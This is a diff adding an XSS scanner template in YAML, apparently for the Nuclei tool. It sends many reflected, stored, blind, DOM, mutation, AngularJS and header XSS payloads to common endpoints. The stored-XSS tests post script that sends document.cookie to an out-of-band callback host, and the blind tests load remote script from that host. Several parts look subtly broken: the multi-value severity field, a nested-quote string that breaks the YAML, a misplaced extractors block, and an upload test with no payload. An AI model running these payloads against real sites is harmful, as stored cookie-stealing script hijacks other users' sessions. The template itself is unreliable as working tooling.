@@ -1,0 +1,317 @@
+id: xss-all-types-detection
+
+info:
+  name: Complete XSS Detection - All Types
+  author: DAAKU
+  severity: critical,high,medium,info
+  description: Detects all types of XSS vulnerabilities including Reflected, Stored, DOM-based, Blind, and Self-XSS with proof extraction
+  tags: xss,reflected,stored,dom,blind,injection
+
+variables:
+  # Unique callback for blind XSS
+  blindPayload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-{{randstr}}'))//"
+  
+  # Multiple XSS payloads for different contexts
+  xssPayloads:
+    - "<script>alert('XSS-{{randstr}}')</script>"
+    - "\"><script>alert('XSS-{{randstr}}')</script>"
+    - "'><script>alert('XSS-{{randstr}}')</script>"
+    - "javascript:alert('XSS-{{randstr}}')"
+    - "\" onmouseover=\"alert('XSS-{{randstr}}')\""
+    - "' onfocus='alert('XSS-{{randstr}}')' autofocus='true"
+    - "<img src=x onerror=alert('XSS-{{randstr}}')>"
+    - "<svg/onload=alert('XSS-{{randstr}}')>"
+    - "<iframe src=javascript:alert('XSS-{{randstr}}')>"
+    - "<details open ontoggle=alert('XSS-{{randstr}}')>"
+    - "<input type=text value=\"XSS\" onfocus=alert('XSS-{{randstr}}') autofocus>"
+    - "<body onload=alert('XSS-{{randstr}}')>"
+    - "{{url_encode('<script>alert(1)</script>')}}"
+    - "%3Cscript%3Ealert('XSS-{{randstr}}')%3C/script%3E"
+    - "\\x3cscript\\x3ealert('XSS-{{randstr}}')\\x3c/script\\x3e"
+    - "<scr<script>ipt>alert('XSS-{{randstr}}')</scr</script>ipt>"
+    - "&lt;script&gt;alert('XSS-{{randstr}}')&lt;/script&gt;"
+    - "-alert('XSS-{{randstr}}')-"
+    - ";alert('XSS-{{randstr}}');"
+    - "{{url_encode('<svg onload=alert(1)>')}}"
+
+http:
+  # ==================== REFLECTED XSS TESTS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{xssPayload}}"
+      - "{{BaseURL}}/search?q={{xssPayload}}"
+      - "{{BaseURL}}/query?input={{xssPayload}}"
+      - "{{BaseURL}}/api/v1/search?term={{xssPayload}}"
+      - "{{BaseURL}}/redirect?url={{xssPayload}}"
+      - "{{BaseURL}}/error?msg={{xssPayload}}"
+      - "{{BaseURL}}/debug?param={{xssPayload}}"
+      - "{{BaseURL}}/test?input={{xssPayload}}"
+      
+    headers:
+      User-Agent: "{{xssPayload}}"
+      Referer: "{{xssPayload}}"
+      X-Forwarded-For: "{{xssPayload}}"
+      X-Forwarded-Host: "{{xssPayload}}"
+      X-Original-URL: "{{xssPayload}}"
+      X-Rewrite-URL: "{{xssPayload}}"
+      CF-Connecting-IP: "{{xssPayload}}"
+      
+    payloads:
+      xssPayload: 
+        - "{{xssPayloads}}"
+        
+    stop-at-first-match: true
+    threads: 10
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XSS-{{randstr}}"
+          - "alert('XSS-"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "XSS-[a-zA-Z0-9]+"
+          - "alert\\(['\"](XSS-[a-zA-Z0-9]+)['\"]\\)"
+
+  # ==================== STORED XSS TESTS ====================
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/comments"
+      - "{{BaseURL}}/post/comment"
+      - "{{BaseURL}}/profile/update"
+      - "{{BaseURL}}/user/feedback"
+      - "{{BaseURL}}/contact/submit"
+      - "{{BaseURL}}/review/add"
+      - "{{BaseURL}}/message/send"
+      
+    body: |
+      {
+        "comment": "{{xssPayload}}",
+        "message": "{{xssPayload}}",
+        "content": "{{xssPayload}}",
+        "text": "{{xssPayload}}",
+        "feedback": "{{xssPayload}}"
+      }
+      
+    headers:
+      Content-Type: application/json
+      
+    payloads:
+      xssPayload:
+        - "<script>fetch('https://{{interactsh-url}}?c='+document.cookie)</script>"
+        - "<img src=x onerror=fetch('https://{{interactsh-url}}?c='+document.cookie)>"
+        - "<svg/onload=fetch('https://{{interactsh-url}}?c='+document.cookie)>"
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+          
+  # ==================== DOM-BASED XSS TESTS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/#{{xssPayload}}"
+      - "{{BaseURL}}/page#{{xssPayload}}"
+      - "{{BaseURL}}/app/{{xssPayload}}#"
+      
+    payloads:
+      xssPayload:
+        - "<script>alert(1)</script>"
+        - "javascript:alert(1)"
+        - "onload=alert(1)"
+        
+    headers:
+      User-Agent: "Mozilla/5.0 (XSS Tester)"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "javascript:"
+          
+  # ==================== BLIND XSS TESTS ====================
+  - method: POST
+    path:
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/support"
+      - "{{BaseURL}}/report"
+      - "{{BaseURL}}/admin/feedback"
+      
+    body: |
+      name=XSS-Tester&email=test@example.com&message={{blindPayload}}&comment={{blindPayload}}
+      
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      
+    payloads:
+      blindPayload:
+        - "\"><script src=//{{interactsh-url}}/xss.js></script>"
+        - "<img src=//{{interactsh-url}}/image.jpg onerror=this.src='//{{interactsh-url}}/error'>"
+        - "<link rel=stylesheet href=//{{interactsh-url}}/style.css>"
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+          
+  # ==================== SELF-XSS TESTS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile?name={{xssPayload}}"
+      - "{{BaseURL}}/settings?theme={{xssPayload}}"
+      
+    payloads:
+      xssPayload:
+        - "';alert('XSS');//"
+        - "\";alert('XSS');//"
+        - "{{url_encode('<script>prompt("XSS")</script>')}}"
+        
+    headers:
+      Cookie: "session={{xssPayload}}"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert('XSS')"
+          - "prompt(\"XSS\")"
+          
+  # ==================== MUTATION XSS TESTS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/test?input={{xssPayload}}"
+      
+    payloads:
+      xssPayload:
+        - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+        - "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          
+  # ==================== XSS IN FILE UPLOAD ====================
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      
+    body: "{{multipart_boundary}}--XSS-FILE"
+    
+    headers:
+      Content-Type: multipart/form-data; boundary={{multipart_boundary}}
+      
+    payloads:
+      multipart_boundary:
+        - "---------------------------XSS"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XSS"
+          
+  # ==================== ANGULARJS XSS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{xssPayload}}"
+      
+    payloads:
+      xssPayload:
+        - "{{constructor.constructor('alert(1)')()}}"
+        - "{{1+alert(1)}}"
+        - "{{7*7}}"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "49"
+          - "alert(1)"
+          
+  # ==================== XSS IN JSON RESPONSE ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?callback={{xssPayload}}"
+      - "{{BaseURL}}/jsonp?callback={{xssPayload}}"
+      
+    payloads:
+      xssPayload:
+        - "alert(1)"
+        - "alert(document.cookie)"
+        - "console.log"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "console.log"
+          
+  # ==================== XSS IN HEADERS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      
+    headers:
+      User-Agent: "<script>alert('XSS')</script>"
+      Referer: "javascript:alert('XSS')"
+      Cookie: "test=<script>alert('XSS')</script>"
+      X-Forwarded-For: "<script>alert('XSS')</script>"
+      
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "<script>alert('XSS')</script>"
+          
+  # ==================== FUZZING XSS ====================
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{fuzz}}"
+      
+    payloads:
+      fuzz:
+        - "{{url_encode('<')}}script{{url_encode('>')}}alert(1){{url_encode('<')}}/script{{url_encode('>')}}"
+        - "{{base64('<script>alert(1)</script>')}}"
+        - "{{hex_encode('<script>alert(1)</script>')}}"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "XSS"
+          
+  # ==================== XSS PROOF EXTRACTOR ====================
+  extractors:
+    - type: dsl
+      dsl:
+        - "body"  # Extract full body for proof
+        - "header"  # Extract headers for header-based XSS
+        
+    - type: regex
+      part: body
+      regex:
+        - "(alert|prompt|confirm)\\(['\"].*?['\"]\\)"
+        - "<script>.*?</script>"
+        - "on\\w+=\\s*['\"]?alert"
+        - "javascript:.*?alert"
+        - "XSS-[a-zA-Z0-9]+"
